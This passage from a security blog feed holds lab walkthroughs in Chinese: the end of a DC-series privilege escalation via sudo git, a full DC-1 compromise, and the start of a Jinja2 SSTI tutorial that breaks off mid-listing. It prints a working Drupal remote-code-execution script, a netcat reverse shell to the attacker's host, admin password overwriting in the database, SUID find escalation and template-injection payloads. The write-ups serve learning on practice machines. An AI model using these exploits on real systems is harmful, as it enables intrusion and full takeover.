src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220194330547.png" alt="image-20211220194330547"></p><p>发现有sudo和su，看看有sudo权限的</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220194650691.png" alt="image-20211220194650691"></p><p>这一波，只能说是意料之中的，要不然jerry这个用户就没啥用了，</p><p>切换到jerry这个用户</p><pre><code>su jerry</code></pre><p>然后</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220195945974.png" alt="image-20211220195945974"></p><p>可以看到可以用root执行git</p><p>用git提权：</p><pre><code>sudo git help config进入页面后输入!/bin/bash</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220200157116.png" alt="image-20211220200157116"></p><p>提权成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220200330185.png" alt="image-20211220200330185"></p><p>找flag</p><p>进入root，里面有个final-flag.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220200535155.png" alt="image-20211220200535155"></p><p>完美结束！</p>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶场练习</title>
      <link href="/2021/12/19/DC-1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/19/DC-1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1靶场练习"><a href="#DC-1靶场练习" class="headerlink" title="DC-1靶场练习"></a>DC-1靶场练习</h1><h2 id="练习环境"><a href="#练习环境" class="headerlink" title="练习环境"></a>练习环境</h2><p>kali:192.168.10.128</p><p>靶机:未知</p><p>两个虚拟机都使用桥接(为了方便)</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用kali扫描域内存活的主机</p><pre><code>nmap 192.168.10.0/24</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219161524442.png" alt="image-20211219161524442"></p><p>扫描到靶机，获得以下信息：</p><ul><li><p>靶机IP:192.168.10.100</p></li><li><p>开放端口: 22(ssh),80(http),111(rpcbind)</p></li></ul><p>先从80端口入手,浏览器打开</p><pre><code>http://192.168.10.100</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219161912348.png" alt="image-20211219161912348"></p><p>使用Wappalyzer查看信息</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219162152997.png" alt="image-20211219162152997"></p><p>可以看到这个网站的cms是<code>Drupal 7</code></p><p>然后就出于本能的去搜索一下这个版本的CMS的漏洞</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219162454136.png" alt="image-20211219162454136"></p><p>经过一番查找，得到该漏洞的交互式命令执行python3脚本：</p><pre><code>import requestsimport refrom sys import argvdomain = argv[1]def exploit(command):    HOST=domain    get_params = &#123;&#39;q&#39;:&#39;user/password&#39;, &#39;name[#post_render][]&#39;:&#39;passthru&#39;, &#39;name[#markup]&#39;:command, &#39;name[#type]&#39;:&#39;markup&#39;&#125;    post_params = &#123;&#39;form_id&#39;:&#39;user_pass&#39;, &#39;_triggering_element_name&#39;:&#39;name&#39;&#125;    r = requests.post(HOST, data=post_params, params=get_params)    m = re.search(r&#39;&lt;input type=&quot;hidden&quot; name=&quot;form_build_id&quot; value=&quot;([^&quot;]+)&quot; /&gt;&#39;, r.text)    if m:        found = m.group(1)        get_params = &#123;&#39;q&#39;:&#39;file/ajax/name/#value/&#39; + found&#125;        post_params = &#123;&#39;form_build_id&#39;:found&#125;        r = requests.post(HOST, data=post_params, params=get_params)        print(&quot;\n&quot;.join(r.text.split(&quot;\n&quot;)[:-1]))while True:    command = input(&#39;$ &#39;)    exploit(command)</code></pre><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>先尝试用这个脚本，将代码保存在rce.py中</p><pre><code>python3 rce.py http://192.168.10.100/</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219163714876.png" alt="image-20211219163714876"></p><p>脚本很强，可以使用，直getshell了，但是使用起来不方便</p><p>尝试在msfconsole中查找脚本</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219164042118.png" alt="image-20211219164042118"></p><p>找到8个，并且<code>exploit/multi/http/drupal_drupageddon </code>的和http有关，应该是这个了</p><p>设置好配置后尝试攻击</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219164634308.png" alt="image-20211219164634308"></p><p>攻击成功</p><p>尝试获取反弹shell</p><pre><code>kali：nc -lvvp 1234 靶机 ：nc -e /bin/bash 192.168.10.128 1234kali：python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165140933.png" alt="image-20211219165140933"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165153578.png" alt="image-20211219165153578"></p><p>反弹成功</p><p>先查看文件一下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165247700.png" alt="image-20211219165247700"></p><p>这里有一个flag1.txt,<code>cat flag1.txt</code>查看</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165548731.png" alt="image-20211219165548731"></p><p>翻译一下：</p><p>“每个好的 CMS 都需要一个配置文件 - 你也是。”</p><p>百度查找一下这个CMS的配置文件名字</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165833472.png" alt="image-20211219165833472"></p><p>路径都查出来了，直接查看settings.php</p><pre><code>cat sites/default/settings.php</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219170147768.png" alt="image-20211219170147768"></p><p>拿到了flag2,并且得到数据库信息</p><p>flag2的翻译：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219170326017.png" alt="image-20211219170326017"></p><p>我不懂作者要表达啥，但我知道要提权</p><p>根据上面信息，尝试连接数据库</p><pre><code>mysql -udbuser -pR0ck3t</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172022853.png" alt="image-20211219172022853"></p><p>连接成功，查看数据库</p><pre><code>show databases;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172120533.png" alt="image-20211219172120533"></p><p>选定数据库drupaldb</p><pre><code>use drupaldb;</code></pre><p>查看这个数据库的表</p><pre><code>show tables;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172403487.png" alt="image-20211219172403487"></p><p>查询到敏感表<code>users</code>,查看里面的信息</p><pre><code>select *from users;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172655690.png" alt="image-20211219172655690"></p><p>可以看到admin的账号密码，密码被hash加密过,这里有两种选择，要么爆破，要么改数据库里的密码</p><p>由flag2提示，爆破这条路似乎走不通，只能修改密码</p><p>首先要找到它的加密脚本丢在哪里，百度一下得知脚本名称为<code>password-hash.sh</code>,然后查找一下</p><pre><code>find / -name password-hash.sh</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219174428472.png" alt="image-20211219174428472"></p><p>得到路径: &#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh</p><p>使用drupal 自带脚本重新生成加密后的密码,这里打算把密码改为admin</p><pre><code>./scripts/password-hash.sh admin</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175317713.png" alt="image-20211219175317713"></p><p>得到加密后的密码;</p><pre><code>$S$DDEzmVGyUponhBeWCHBORSLh8X/MX1k0dnHdjF2QG8eq3IDaugr6</code></pre><p>回到mysql修改admin密码</p><pre><code>update users set pass=&#39;$S$DDEzmVGyUponhBeWCHBORSLh8X/MX1k0dnHdjF2QG8eq3IDaugr6&#39; where uid=1;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175635384.png" alt="image-20211219175635384"></p><p>密码修改成功</p><p>来到后台尝试登录</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175851595.png" alt="image-20211219175851595"></p><p>登录成功，并且得到flag3</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175949955.png" alt="image-20211219175949955"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219180031924.png" alt="image-20211219180031924"></p><p>翻译一下：</p><p><code>特殊的PERMS 将帮助查找passwd——但您需要-exec 该命令来确定如何获取shadow中的内容。</code></p><p>根据提示，查看&#x2F;etc&#x2F;passwd：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219200505179.png" alt="image-20211219200505179"></p><p>这里可以看到有个flag4用户，并且知道flag4路径，还有bash</p><p>查看&#x2F;etc&#x2F;shadow：权限不够</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219200613083.png" alt="image-20211219200613083"></p><p>先查看flag4内容</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219180624886.png" alt="image-20211219180624886"></p><pre><code>Can you use this same method to find or access the flag in root?您可以使用相同的方法在 root 中查找或访问flag吗？Probably. But perhaps it&#39;s not that easy.  Or maybe it is?大概。 但也许没那么容易。 或者也许是？</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>liunx提权一般有四种提权方式：</p><ul><li><p>sudo提权，通过命令<code>sudo -l</code>查看是否有可提权的命令。</p></li><li><p>suid提权，通过命令<code>find / -perm -4000 2&gt;/dev/null</code>查看是否具有root权限的命令，</p></li><li><p>系统版本内核提权。</p></li><li><p>通过数据库提权。</p></li></ul><p>先列出来以root权限执行的文件</p><pre><code>find / -perm -4000 2&gt;/dev/null</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219204647219.png" alt="image-20211219204647219"></p><p>find可以使用</p><p>常见的可以用来提权的文件:</p><pre><code>NmapVimfindBashMoreLessNanocp</code></pre><p>find 命令说明<br>-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。-exec参数后面跟的就是我们想进一步操作的命令,so，我们可以以root的权限命令执行了。</p><pre><code>//这个要在/var/www下执行touch getflagfind / -type f -name getflag -exec &quot;whoami&quot; \;find / -type f -name getflag -exec &quot;/bin/sh&quot; \;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219210216024.png"></p><p>提权成功，获取root权限</p><p>现在目标就是找最后的flag,最后的flag在root目录下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219205951044.png"></p><pre><code>Well done!!!!Hopefully you&#39;ve enjoyed this and learned some new skills.You can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti学习</title>
      <link href="/2021/12/16/ssti%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/12/16/ssti%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="ssti学习"><a href="#ssti学习" class="headerlink" title="ssti学习"></a>ssti学习</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我这里用了vulhub+docker-compose搭建的环境</p><p>下载好docker、docker-compose和vulhub后，找到ssti对应文件夹，打开终端</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>然后用浏览器访问本机的8000端口</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211216223957040.png" alt="image-20211216223957040"></p><h2 id="漏洞检验"><a href="#漏洞检验" class="headerlink" title="漏洞检验"></a>漏洞检验</h2><p>页面啥也没有，只能去看看源码了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211216224756010.png" alt="image-20211216224756010"></p><p>从源码得知，参数是name，用get方法传入参数</p><hr><p>假设没看源码，需要给参数传入一些东西来检验它存不存在ssti</p><p>为了方便，这里用burpsuite抓包</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211216225747049.png" alt="image-20211216225747049"></p><p>传入的是</p><pre><code>?name=&#123;&#123;7*7&#125;&#125;</code></pre><p>页面返回<code>49</code>，说明这里存在ssti漏洞,而且还是jinja2的</p><p><img src="https://p5.ssl.qhimg.com/t01a66955048c86d5b6.png" alt="1"></p><h2 id="漏洞利用套路"><a href="#漏洞利用套路" class="headerlink" title="漏洞利用套路"></a>漏洞利用套路</h2><p>基本思路就是利用 python 中的<code>魔术方法</code>找到自己要用的函数</p><ul><li><p>dict: 保存类实例或对象实例的属性变量键值对字典</p></li><li><p>class: 返回调用的参数类型</p></li><li><p>mro: 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析</p></li><li><p>bases: 返回类型列表</p></li><li><p>subclasses: 返回object的子类</p></li><li><p>init: 类的初始化方法</p></li><li><p>globals: 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</p><pre><code>base和 mro都是用来寻找基类的。</code></pre></li></ul><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>使用魔术方法进行函数解析，再获取基本类：</p><pre><code>&#39;&#39;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用</code></pre><p><code>[]</code>内的数字不是固定的，这一步主要是找到object类</p><pre><code>?name=&#123;&#123;''.__class__.__mro__&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217102722307.png" alt="image-20211217102722307"></p><p>所以第一步用的payload是</p><pre><code>?name=&#123;&#123;''.__class__.__mro__[1]&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217102839137.png" alt="image-20211217102839137"></p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>获取基本类后，继续向下获取基本类 object 的子类：</p><pre><code>?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217103214134.png" alt="image-20211217103214134"></p><p>这里得到的东西有点眼花缭乱，但是不要慌，找准目标，什么都好说</p><p>这一步我们要找的是<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>,返回的类太多，很难找到它对应的下标，一个个数，不太现实</p><p>这里写个小小脚本</p><pre><code class="python">str=&quot;&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;_sre.SRE_Pattern&#39;&gt;, &lt;class &#39;_sre.SRE_Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.Pattern&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;_hashlib.HASH&#39;&gt;, &lt;class &#39;_blake2.blake2b&#39;&gt;, &lt;class &#39;_blake2.blake2s&#39;&gt;, &lt;class &#39;_sha3.sha3_224&#39;&gt;, &lt;class &#39;_sha3.sha3_256&#39;&gt;, &lt;class &#39;_sha3.sha3_384&#39;&gt;, &lt;class &#39;_sha3.sha3_512&#39;&gt;, &lt;class &#39;_sha3.shake_128&#39;&gt;, &lt;class &#39;_sha3.shake_256&#39;&gt;, &lt;class &#39;_random.Random&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;_socket.socket&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class &#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse._NetlocResultMixinBase&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;_ast.AST&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;dis.Bytecode&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect._void&#39;&gt;, &lt;class &#39;inspect._empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;textwrap.TextWrapper&#39;&gt;, &lt;class &#39;__future__._Feature&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;_bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;_bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;_lzma.LZMACompressor&#39;&gt;, &lt;class &#39;_lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;zipfile.ZipInfo&#39;&gt;, &lt;class &#39;zipfile._ZipDecrypter&#39;&gt;, &lt;class &#39;zipfile.LZMACompressor&#39;&gt;, &lt;class &#39;zipfile.LZMADecompressor&#39;&gt;, &lt;class &#39;zipfile._SharedFile&#39;&gt;, &lt;class &#39;zipfile._Tellable&#39;&gt;, &lt;class &#39;zipfile.ZipFile&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;pyexpat.xmlparser&#39;&gt;, &lt;class &#39;plistlib.Data&#39;&gt;, &lt;class &#39;plistlib._PlistParser&#39;&gt;, &lt;class &#39;plistlib._DumbXMLWriter&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistParser&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistWriter&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;tempfile._RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;pkg_resources.extern.VendorImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.appdirs.AppDirs&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.Infinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.NegativeInfinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.version._BaseVersion&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.specifiers.BaseSpecifier&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._Constants&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._ParseResultsWithOffset&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParseResults&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache&#39;&gt;, &lt;class 